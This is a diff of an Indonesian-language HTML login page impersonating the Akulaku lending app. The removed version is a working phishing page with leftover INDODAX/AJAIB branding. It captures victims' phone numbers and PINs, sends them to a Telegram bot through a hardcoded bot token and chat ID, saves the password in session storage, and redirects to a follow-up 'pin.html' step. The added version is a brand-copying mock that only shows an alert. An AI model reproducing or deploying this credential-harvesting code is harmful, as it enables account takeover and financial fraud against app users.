@@ -1,270 +1,193 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Login AKULAKU</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Akulaku</title>
+    <style>
+        /* Reset Dasar */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-<!-- Meta Tags untuk Open Graph (agar gambar INDODAX muncul saat share link ke WhatsApp) -->
-<meta property="og:title" content="Masuk ke AKULAKU" />
-<meta property="og:description" content="Login ke akun AKULAKU Anda dengan aman." />
-<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" /><!-- Gambar INDODAX dari link Anda -->
-<meta property="og:url" content="https://indodax-log.vercel.app/" /> <!-- Ganti dengan URL halaman Anda yang sebenarnya -->
-<meta property="og:type" content="website" />
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+        /* Container Utama */
+        .login-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
 
-  body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #fff;
-    margin: 40px 16px;
-    color: #000;
-  }
-  .container {
-    max-width: 360px;
-    margin: 0 auto;
-  }
-  .logo {
-    width: 100px; /* Sesuaikan ukuran logo sesuai kebutuhan */
-    height: auto;
-    margin-bottom: 32px;
-    display: block;
-    margin-left: auto;
-    margin-right: auto;
-  }
-  label {
-    display: block;
-    font-weight: 600;
-    font-size: 14px;
-    margin-bottom: 6px;
-  }
-  input[type="email"],
-  input[type="password"] {
-    width: 100%;
-    font-size: 14px;
-    padding: 12px 40px 12px 12px; /* padding right untuk icon mata */
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    box-sizing: border-box;
-    color: #555;
-    outline: none;
-    transition: border-color 0.2s;
-  }
-  input[type="email"]:focus,
-  input[type="password"]:focus {
-    border-color: #2076f3;
-  }
-  input::placeholder {
-    color: #aaa;
-  }
-  .password-container {
-    position: relative;
-    margin-bottom: 8px;
-  }
-  .eye-icon {
-    position: absolute;
-    right: 10px;
-    top: 50%;
-    transform: translateY(-50%);
-    width: 20px;
-    height: 20px;
-    cursor: pointer;
-    color: #888;
-    user-select: none;
-  }
-  .forgot-link {
-    display: block;
-    font-size: 13px;
-    color: #2076f3;
-    text-align: right;
-    text-decoration: none;
-    margin-bottom: 24px;
-  }
-  .forgot-link:hover {
-    text-decoration: underline;
-  }
-  button.login-btn {
-    width: 100%;
-    padding: 12px 0;
-    font-size: 14px;
-    font-weight: 600;
-    border-radius: 6px;
-    border: none;
-    background-color: #d4d4e3;
-    color: #888;
-    cursor: not-allowed;
-    margin-bottom: 24px;
-    transition: background-color 0.3s, color 0.3s;
-  }
-  button.login-btn.enabled {
-    background-color: #2076f3;
-    color: #fff;
-    cursor: pointer;
-  }
-  .or-text {
-    text-align: center;
-    font-weight: 400;
-    font-size: 14px;
-    margin-bottom: 20px;
-  }
-  button.google-btn {
-    width: 100%;
-    border: 1px solid #ddd;
-    padding: 10px 0;
-    border-radius: 6px;
-    background-color: #fff;
-    font-weight: 700;
-    font-size: 14px;
-    cursor: pointer;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    user-select: none;
-  }
-  .google-icon {
-    width: 20px;
-    height: 20px;
-  }
-</style>
+        /* Logo Teks */
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #FF5722; /* Warna khas Akulaku */
+            margin-bottom: 10px;
+            letter-spacing: -1px;
+        }
+        
+        .sub-logo {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        /* Form Input */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #FF5722;
+        }
+
+        /* Tombol Login */
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #FF5722;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-login:hover {
+            background-color: #E64A19;
+        }
+
+        /* Link Bantu */
+        .helper-links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+
+        .helper-links a {
+            text-decoration: none;
+            color: #666;
+        }
+
+        .helper-links a:hover {
+            color: #FF5722;
+            text-decoration: underline;
+        }
+
+        /* Footer Daftar */
+        .footer-register {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer-register a {
+            color: #FF5722;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .footer-register a:hover {
+            text-decoration: underline;
+        }
+
+        /* Pesan Error (Hidden by default) */
+        .error-msg {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Logo dengan link gambar baru -->
-    <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
 
-    <form id="loginForm" novalidate>
-      <label for="email">Nomor Hp</label>
-      <input type="tel" id="email" name="email" placeholder="081234567890l" required />
+    <div class="login-container">
+        <div class="logo">akulaku</div>
+        <div class="sub-logo">Belanja sekarang, bayar nanti</div>
 
-      <label for="password">PIN</label>
-      <div class="password-container">
-        <input type="password" id="password" name="password" placeholder="Masukkan 6 digit PIN" required />
-        <svg id="togglePassword" class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
-          <!-- mata terbuka -->
-          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
-          <circle cx="12" cy="12" r="3"></circle>
-        </svg>
-      </div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="phone">Nomor Ponsel / Email</label>
+                <input type="text" id="phone" placeholder="Contoh: 081234567890" required>
+            </div>
 
-      <a href="#" class="forgot-link">Lupa Kata PIN?</a>
+            <div class="input-group">
+                <label for="password">Kata Sandi</label>
+                <input type="password" id="password" placeholder="Masukkan kata sandi" required>
+                <div class="error-msg" id="errorMsg">Nomor ponsel atau kata sandi salah</div>
+            </div>
 
-      <button type="submit" id="loginBtn" class="login-btn" disabled>Masuk</button>
-    </form>
+            <button type="submit" class="btn-login">Masuk</button>
+        </form>
 
-    <div class="or-text">atau</div>
+        <div class="helper-links">
+            <a href="#">Lupa Kata Sandi?</a>
+            <a href="#">Bantuan</a>
+        </div>
 
-    <button class="google-btn">
-      <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3" aria-hidden="true" focusable="false">
-        <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
-        <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
-        <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
-        <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
-      </svg>
-      Lanjut dengan Google
-    </button>
-  </div>
+        <div class="footer-register">
+            Belum punya akun? <a href="#">Daftar</a>
+        </div>
+    </div>
 
-  <!-- Load jQuery dari CDN -->
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Mencegah form submit secara default
+            
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
 
-  <!-- Script JS Gabungan -->
-  <script>
-  $(document).ready(function() {
-      console.log('JS loaded'); // Debug: Pastikan JS berjalan
+            // Simulasi Validasi Sederhana
+            if(phone.length < 5 || password.length < 4) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = "Format nomor ponsel atau kata sandi tidak valid.";
+            } else {
+                errorMsg.style.display = 'none';
+                alert(`Login berhasil!\nNomor: ${phone}`);
+                // Di sini biasanya Anda akan mengirim data ke server (Backend)
+            }
+        });
+    </script>
 
-      // Toggle show/hide password dengan ikon mata
-      $('#togglePassword').on('click', function() {
-          const passwordField = $('#password');
-          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
-          passwordField.attr('type', type);
-
-          // Ganti SVG ikon mata sesuai status
-          if (type === 'password') {
-              // Ikon mata terbuka (show password)
-              $(this).html(`
-                  <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
-                  <circle cx="12" cy="12" r="3"/>
-              `);
-          } else {
-              // Ikon mata tertutup (hide password)
-              $(this).html(`
-                  <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"/>
-                  <line x1="1" y1="1" x2="23" y2="23"/>
-                  <path d="M10.58 10.58a3 3 0 004.24 4.24"/>
-              `);
-          }
-      });
-
-      // Fungsi validasi form: email ada '@' dan password tidak kosong
-      function isFormValid() {
-          const email = $('#email').val().trim();
-          const password = $('#password').val().trim();
-          return email !== '' && email.includes('08') && password !== '';
-      }
-
-      // Toggle enable/disable tombol "Masuk" berdasarkan validasi
-      function toggleLoginButton() {
-          if (isFormValid()) {
-              $('#loginBtn').prop('disabled', false).addClass('enabled');
-          } else {
-              $('#loginBtn').prop('disabled', true).removeClass('enabled');
-          }
-      }
-
-      // Event input untuk validasi real-time
-      $('#email, #password').on('input', toggleLoginButton);
-
-      // Submit form: kirim data ke Telegram dan simpan session
-      $('#loginForm').on('submit', function(e) {
-          e.preventDefault();
-
-          if (!isFormValid()) {
-              console.log("Validasi gagal: Email harus ada '@' dan password tidak kosong.");
-              return;
-          }
-
-          const email = $('#email').val().trim();
-          const password = $('#password').val().trim();
-
-          // Format pesan untuk dikirim ke Telegram
-          const message = `
-Masuk ke AJAIB
-------------------------
-Alamat Email: ${email}
-Kata Sandi: ${password}
-------------------------
-          `;
-
-          // Ganti dengan token bot Telegram dan chat ID Anda (jangan hardcode di production)
-          const token_bot = '8422018014:AAGHHrRoycj_EZwiEubdtxUEEtOQ1iqnA9w'; // Contoh: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz'
-          const telegram_id = '8424964369'; // Contoh: '123456789'
-
-          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;
-
-          // Kirim request ke Telegram API menggunakan jQuery $.get
-          $.get(url)
-              .done(function(data) {
-                  if (data.ok) {
-                      console.log('Data berhasil dikirim ke Telegram');
-
-                      // Simpan data ke sessionStorage (tersimpan selama tab/browser terbuka)
-                      sessionStorage.setItem('email', email);
-                      sessionStorage.setItem('password', password); // Hati-hati: jangan simpan password di production, gunakan token saja
-
-                      // Redirect ke halaman OTP setelah sukses
-                      window.location.href = 'pin.html';
-                  } else {
-                      console.error('Error sending message:', data);
-                  }
-              })
-              .fail(function(xhr, status, error) {
-                  console.error('Fetch error:', error);
-              });
-      });
-
-  });
-  </script>
 </body>
-  </html>
+</html>
